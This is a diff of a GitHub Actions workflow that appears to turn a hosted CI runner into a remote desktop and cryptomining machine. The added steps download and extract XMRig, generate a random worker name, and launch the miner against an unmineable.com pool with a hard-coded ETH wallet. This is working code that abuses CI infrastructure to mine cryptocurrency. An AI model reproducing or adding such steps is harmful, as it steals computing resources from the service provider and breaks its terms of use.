@@ -48,7 +48,7 @@ jobs:
 
       - name: Install Tailscale
         run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi  "
+          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
           $installerPath = "$env:TEMP\tailscale.msi"
           
           Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
@@ -87,20 +87,56 @@ jobs:
           }
           Write-Host "TCP connectivity successful!"
 
-      - name: Download unMiner
+      - name: Download and Extract XMRig
         run: |
-          $downloadUrl = "https://cdn.unmineable.download/unMiner.2.8.0-beta.exe"
+          $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-windows-x64.zip"
           $desktopPath = "C:\Users\RDP\Desktop"
-          $filePath = Join-Path $desktopPath "unMiner.2.8.0-beta.exe"
+          $zipPath = Join-Path $desktopPath "xmrig-6.24.0-windows-x64.zip"
+          $extractPath = Join-Path $desktopPath "xmrig"
           
           # Ensure the directory exists
           if (-not (Test-Path $desktopPath)) {
               New-Item -ItemType Directory -Path $desktopPath -Force
           }
           
-          Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
+          # Download the zip file
+          Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
           
-          Write-Host "unMiner downloaded to RDP Desktop: $filePath"
+          # Extract the zip file
+          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+          
+          # Clean up the zip file
+          Remove-Item $zipPath -Force
+          
+          Write-Host "XMRig extracted to: $extractPath"
+
+      - name: Generate Random Worker Name
+        run: |
+          # Generate a random worker name
+          $chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+          $workerName = "unmineable_worker_" + (-join ((1..10) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] }))
+          echo "WORKER_NAME=$workerName" >> $env:GITHUB_ENV
+          Write-Host "Generated worker name: $workerName"
+
+      - name: Run XMRig
+        run: |
+          $desktopPath = "C:\Users\RDP\Desktop"
+          $extractPath = Join-Path $desktopPath "xmrig"
+          $xmrigPath = Join-Path $extractPath "xmrig-6.24.0"
+          $xmrigExe = Join-Path $xmrigPath "xmrig.exe"
+          
+          # Create a batch file to run xmrig
+          $batchContent = @"
+          cd "$xmrigPath"
+          "$xmrigExe" -a rx -o stratum+ssl://rx.unmineable.com:443 -u ETH:0x28aE9c6650C8822B7e232d7f6649D8a7c6879718.$env:WORKER_NAME -p x
+          pause
+          "@
+          
+          $batchPath = Join-Path $extractPath "run_xmrig.bat"
+          $batchContent | Out-File -FilePath $batchPath -Encoding ASCII
+          
+          # Execute the batch file
+          Start-Process -FilePath $batchPath -WorkingDirectory $xmrigPath
 
       - name: Maintain Connection
         run: |
